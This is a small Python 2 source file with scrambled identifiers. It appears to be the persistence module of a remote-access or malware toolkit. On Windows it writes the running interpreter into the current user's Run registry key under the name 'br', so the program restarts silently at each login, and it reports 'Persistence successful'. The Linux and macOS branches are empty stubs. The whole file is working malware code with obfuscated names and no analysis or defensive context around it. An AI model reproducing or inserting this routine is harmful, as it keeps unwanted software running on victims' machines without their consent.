# -*- coding: utf-8 -*-















import sys















def AYTvpajsNekdTvNxwqbmwpNGsTEAABjb():



    import _winreg



    from _winreg import HKEY_CURRENT_USER as HKCU







    ioiZgkLFBQRZSOvBhUDQRmkTxCySddRK = r'Software\Microsoft\Windows\CurrentVersion\Run'



    JZPYQKlzmlWBRFIpLLbHsjXSFIeaNNfw = sys.executable







    try:



        eoZvCTvTNIEhwtBulAFbzSuUvmgqoSSp = _winreg.OpenKey(HKCU, ioiZgkLFBQRZSOvBhUDQRmkTxCySddRK, 0, _winreg.KEY_WRITE)



        _winreg.SetValueEx(eoZvCTvTNIEhwtBulAFbzSuUvmgqoSSp, 'br', 0, _winreg.REG_SZ, JZPYQKlzmlWBRFIpLLbHsjXSFIeaNNfw)



        _winreg.CloseKey(eoZvCTvTNIEhwtBulAFbzSuUvmgqoSSp)



        return True, 'HKCU Run registry key applied'



    except WindowsError:



        return False, 'HKCU Run registry key failed'







def EeOIRPwXunDrzxRddLVKXlfrwuIzklmA():



    return False, 'nothing here yet'







def sZqwAHguubpdicOrhZGwdAYzPeWNUnHR():



    return False, 'nothing here yet'







def neXHQFUrpIpNIlNvEzKZrKneZUJsRZwj(plat_type):



    if plat_type.startswith('win'):



        success, ROJYtmasNTQVfSsumXRkGTSbrGKRwEIu = AYTvpajsNekdTvNxwqbmwpNGsTEAABjb()



    elif plat_type.startswith('linux'):



        success, ROJYtmasNTQVfSsumXRkGTSbrGKRwEIu = EeOIRPwXunDrzxRddLVKXlfrwuIzklmA()



    elif plat_type.startswith('darwin'):



        success, ROJYtmasNTQVfSsumXRkGTSbrGKRwEIu = sZqwAHguubpdicOrhZGwdAYzPeWNUnHR()



    else:



        return 'Error, platform unsupported.'







    if success:



        JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl = 'Persistence successful, {}.'.format(ROJYtmasNTQVfSsumXRkGTSbrGKRwEIu)



    else:



        JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl = 'Persistence unsuccessful, {}.'.format(ROJYtmasNTQVfSsumXRkGTSbrGKRwEIu)







    return JMhxqeaIeJXDXwwnybpFOXRREgBVDhQl



